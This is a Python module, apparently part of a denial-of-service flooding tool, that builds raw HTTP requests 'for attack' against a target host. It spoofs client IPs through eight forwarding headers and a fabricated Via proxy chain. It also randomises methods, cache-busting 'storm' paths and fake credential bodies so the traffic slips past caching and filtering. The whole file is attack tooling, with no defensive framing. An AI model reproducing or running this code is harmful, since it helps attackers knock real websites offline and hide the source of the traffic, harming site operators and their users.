#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
HTTP Method Builder - Support multiple HTTP methods for attack
"""

import random
from typing import Optional, Dict
from enum import Enum

class HTTPMethod(Enum):
    """Supported HTTP methods"""
    GET = "GET"
    POST = "POST"
    HEAD = "HEAD"
    OPTIONS = "OPTIONS"
    PUT = "PUT"
    DELETE = "DELETE"
    PATCH = "PATCH"

class HTTPMethodBuilder:
    """Build HTTP requests for different methods"""
    
    @staticmethod
    def build_get(
        target_ip: str,
        path: str = "/",
        user_agent: str = "Mozilla/5.0",
        spoofed_ip: Optional[str] = None,
        custom_headers: Optional[Dict[str, str]] = None
    ) -> str:
        """
        Build GET request
        
        Args:
            target_ip: Target host
            path: Request path
            user_agent: User-Agent string
            spoofed_ip: IP for spoofing headers
            custom_headers: Additional headers
            
        Returns:
            Complete HTTP GET request
        """
        request = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {target_ip}\r\n"
            f"User-Agent: {user_agent}\r\n"
        )
        
        # Add spoofing headers
        if spoofed_ip:
            request += HTTPMethodBuilder._add_spoofing_headers(spoofed_ip)
        
        # Add custom headers
        if custom_headers:
            for key, value in custom_headers.items():
                request += f"{key}: {value}\r\n"
        
        # Standard headers
        request += (
            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            f"Accept-Language: en-US,en;q=0.5\r\n"
            f"Accept-Encoding: gzip, deflate\r\n"
            f"Connection: keep-alive\r\n"
            f"Keep-Alive: timeout=300, max=1000\r\n"
            f"Cache-Control: max-age=0\r\n"
        )
        
        return request
    
    @staticmethod
    def build_post(
        target_ip: str,
        path: str = "/",
        user_agent: str = "Mozilla/5.0",
        spoofed_ip: Optional[str] = None,
        body_data: Optional[str] = None,
        custom_headers: Optional[Dict[str, str]] = None
    ) -> str:
        """
        Build POST request with body
        
        Args:
            target_ip: Target host
            path: Request path
            user_agent: User-Agent string
            spoofed_ip: IP for spoofing
            body_data: POST body data
            custom_headers: Additional headers
            
        Returns:
            Complete HTTP POST request
        """
        # Generate random body if not provided
        if body_data is None:
            body_data = HTTPMethodBuilder._generate_random_body()
        
        content_length = len(body_data)
        
        request = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {target_ip}\r\n"
            f"User-Agent: {user_agent}\r\n"
        )
        
        # Add spoofing headers
        if spoofed_ip:
            request += HTTPMethodBuilder._add_spoofing_headers(spoofed_ip)
        
        # Add custom headers
        if custom_headers:
            for key, value in custom_headers.items():
                request += f"{key}: {value}\r\n"
        
        # POST-specific headers
        request += (
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {content_length}\r\n"
            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            f"Accept-Language: en-US,en;q=0.5\r\n"
            f"Accept-Encoding: gzip, deflate\r\n"
            f"Connection: keep-alive\r\n"
            f"Keep-Alive: timeout=300, max=1000\r\n"
            f"\r\n"
            f"{body_data}"
        )
        
        return request
    
    @staticmethod
    def build_head(
        target_ip: str,
        path: str = "/",
        user_agent: str = "Mozilla/5.0",
        spoofed_ip: Optional[str] = None,
        custom_headers: Optional[Dict[str, str]] = None
    ) -> str:
        """
        Build HEAD request (like GET but no body expected)
        
        Returns:
            Complete HTTP HEAD request
        """
        request = (
            f"HEAD {path} HTTP/1.1\r\n"
            f"Host: {target_ip}\r\n"
            f"User-Agent: {user_agent}\r\n"
        )
        
        if spoofed_ip:
            request += HTTPMethodBuilder._add_spoofing_headers(spoofed_ip)
        
        if custom_headers:
            for key, value in custom_headers.items():
                request += f"{key}: {value}\r\n"
        
        request += (
            f"Accept: */*\r\n"
            f"Connection: keep-alive\r\n"
            f"Keep-Alive: timeout=300, max=1000\r\n"
        )
        
        return request
    
    @staticmethod
    def build_options(
        target_ip: str,
        path: str = "*",
        user_agent: str = "Mozilla/5.0",
        spoofed_ip: Optional[str] = None,
        custom_headers: Optional[Dict[str, str]] = None
    ) -> str:
        """
        Build OPTIONS request (query allowed methods)
        
        Returns:
            Complete HTTP OPTIONS request
        """
        request = (
            f"OPTIONS {path} HTTP/1.1\r\n"
            f"Host: {target_ip}\r\n"
            f"User-Agent: {user_agent}\r\n"
        )
        
        if spoofed_ip:
            request += HTTPMethodBuilder._add_spoofing_headers(spoofed_ip)
        
        if custom_headers:
            for key, value in custom_headers.items():
                request += f"{key}: {value}\r\n"
        
        request += (
            f"Accept: */*\r\n"
            f"Connection: keep-alive\r\n"
            f"Keep-Alive: timeout=300, max=1000\r\n"
        )
        
        return request
    
    @staticmethod
    def build_put(
        target_ip: str,
        path: str = "/",
        user_agent: str = "Mozilla/5.0",
        spoofed_ip: Optional[str] = None,
        body_data: Optional[str] = None,
        custom_headers: Optional[Dict[str, str]] = None
    ) -> str:
        """
        Build PUT request
        
        Returns:
            Complete HTTP PUT request
        """
        if body_data is None:
            body_data = HTTPMethodBuilder._generate_random_body()
        
        content_length = len(body_data)
        
        request = (
            f"PUT {path} HTTP/1.1\r\n"
            f"Host: {target_ip}\r\n"
            f"User-Agent: {user_agent}\r\n"
        )
        
        if spoofed_ip:
            request += HTTPMethodBuilder._add_spoofing_headers(spoofed_ip)
        
        if custom_headers:
            for key, value in custom_headers.items():
                request += f"{key}: {value}\r\n"
        
        request += (
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {content_length}\r\n"
            f"Connection: keep-alive\r\n"
            f"Keep-Alive: timeout=300, max=1000\r\n"
            f"\r\n"
            f"{body_data}"
        )
        
        return request
    
    @staticmethod
    def build_delete(
        target_ip: str,
        path: str = "/",
        user_agent: str = "Mozilla/5.0",
        spoofed_ip: Optional[str] = None,
        custom_headers: Optional[Dict[str, str]] = None
    ) -> str:
        """
        Build DELETE request
        
        Returns:
            Complete HTTP DELETE request
        """
        request = (
            f"DELETE {path} HTTP/1.1\r\n"
            f"Host: {target_ip}\r\n"
            f"User-Agent: {user_agent}\r\n"
        )
        
        if spoofed_ip:
            request += HTTPMethodBuilder._add_spoofing_headers(spoofed_ip)
        
        if custom_headers:
            for key, value in custom_headers.items():
                request += f"{key}: {value}\r\n"
        
        request += (
            f"Accept: */*\r\n"
            f"Connection: keep-alive\r\n"
            f"Keep-Alive: timeout=300, max=1000\r\n"
        )
        
        return request
    
    @staticmethod
    def build_random(
        target_ip: str,
        path: str = None,
        user_agent: str = "Mozilla/5.0",
        spoofed_ip: Optional[str] = None,
        custom_headers: Optional[Dict[str, str]] = None
    ) -> str:
        """
        Build random HTTP method request
        
        Returns:
            Random HTTP request
        """
        methods = [
            HTTPMethodBuilder.build_get,
            HTTPMethodBuilder.build_post,
            HTTPMethodBuilder.build_head,
            HTTPMethodBuilder.build_options,
        ]
        
        method = random.choice(methods)
        
        if path is None:
            path = HTTPMethodBuilder._generate_random_path()
        
        return method(target_ip, path, user_agent, spoofed_ip, custom_headers)
    
    # ========================================================================
    # PRIVATE HELPER METHODS
    # ========================================================================
    
    @staticmethod
    def _add_spoofing_headers(spoofed_ip: str) -> str:
        """Add IP spoofing headers"""
        from .ip_generator import IPGenerator
        
        headers = (
            f"X-Forwarded-For: {spoofed_ip}\r\n"
            f"X-Real-IP: {spoofed_ip}\r\n"
            f"X-Client-IP: {spoofed_ip}\r\n"
            f"X-Originating-IP: {spoofed_ip}\r\n"
            f"Client-IP: {spoofed_ip}\r\n"
            f"True-Client-IP: {spoofed_ip}\r\n"
            f"CF-Connecting-IP: {spoofed_ip}\r\n"
            f"X-ProxyUser-IP: {spoofed_ip}\r\n"
        )
        
        # Add Via header with proxy chain
        via_chain = IPGenerator.generate_proxy_chain()
        headers += f"Via: {via_chain}\r\n"
        
        return headers
    
    @staticmethod
    def _generate_random_path() -> str:
        """Generate random request path"""
        paths = [
            "/",
            "/index.html",
            "/api/endpoint",
            "/admin",
            "/login",
            "/search",
            "/api/v1/data",
            "/assets/image.jpg",
        ]
        
        path = random.choice(paths)
        
        # Add random query parameter
        rand_param = random.randint(1, 999999)
        return f"{path}?storm={rand_param}"
    
    @staticmethod
    def _generate_random_body() -> str:
        """Generate random POST body data"""
        templates = [
            f"username=user{random.randint(1,9999)}&password=pass{random.randint(1,9999)}",
            f"search={random.randint(1,9999)}&page={random.randint(1,100)}",
            f"data={random.randint(1,9999)}&token={random.randint(100000,999999)}",
            f"id={random.randint(1,9999)}&action=update&value={random.randint(1,9999)}",
        ]
        
        return random.choice(templates)
